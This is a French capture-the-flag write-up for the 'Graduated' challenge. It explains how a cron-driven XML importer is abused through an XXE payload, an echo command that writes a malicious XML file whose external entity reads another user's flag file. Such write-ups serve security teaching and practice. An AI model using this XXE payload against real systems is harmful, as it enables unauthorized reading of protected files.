# Graduated - 256 points

Après s'être connecté via ssh on remarque diverses choses:

`graduation.db` constitue une base de données SQLite, dont on pourra éventuellement lire en clair les informations.

`integrator.log` nous informe du fonctionnement du système :

```
-bash-5.1$ head -n 20 integrator.log
02/04/2021 09:33:01 [+] Lancement de l'intégration
02/04/2021 09:33:01 [+] Création de la base de données.
02/04/2021 09:33:01 [+] Analye des fichiers dans "/home/teacher/evaluations/".
02/04/2021 09:33:01 [+] Fichier "eval.xml" en cours d'analyse.
02/04/2021 09:33:01 [+] Nouvelle évaluation ajoutée.
02/04/2021 09:33:01 [+] Fichier "eval.xml" analysé.
02/04/2021 09:33:01 [+] Intégration terminée


02/04/2021 09:34:01 [+] Lancement de l'intégration
02/04/2021 09:34:01 [+] Analye des fichiers dans "/home/teacher/evaluations/".
02/04/2021 09:34:01 [+] Intégration terminée


02/04/2021 09:35:01 [+] Lancement de l'intégration
02/04/2021 09:35:01 [+] Analye des fichiers dans "/home/teacher/evaluations/".
02/04/2021 09:35:01 [+] Intégration terminée


02/04/2021 09:36:01 [+] Lancement de l'intégration
```

On en déduit ainsi que toutes les minutes, un script analyse les nouveaux XML dans `/home/teacher/evaluations/`, où nous avons droit d'écriture étant connecté comme `teacher`, et après les avoir parsé les place très probablement dans la BDD SQLite où on retrouve les informations de `eval.xml`.

Le script réalisant cette intégration est `integrator.py`, lancé périodiquement via une `crontab`. Malheureusement nous n'avons pas les droits de lecture de celui-ci. Sans donc pouvoir en être certains, on peut suspecter une vulnérabilité `XXE` dans le parser XML du script, qu'on pourrait utiliser pour lire des fichiers avec ses privilèges.

On place donc un XML malicieux dans le dossier analysé périodiquement, en se basant sur le template gentiment fourni pour ne pas avoir de problèmes avec la BDD :

```
echo '<?xml version="1.0" encoding="utf-8"?>
> <!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///home/rector/flag.txt"> ]>
> 
> <evaluation>
>   <student>
>     <firstname>Xavier</firstname>
>     <lastname>DUPONT DE L</lastname>
>   </student>
>   <grade>15</grade>
>   <subject>Biologie</subject>
>   <teacher>
>     <firstname>Emile</firstname>
>     <lastname>LOUIS</lastname>
>   </teacher>
>   <comment>&ent;</comment>
> </evaluation>
> ' > evaluations/TEST1.xml
```

Après avoir constaté l'analyse de notre XML dans `integrator.log`, on peut lire le flag dans la BDD avec `cat graduation.db`.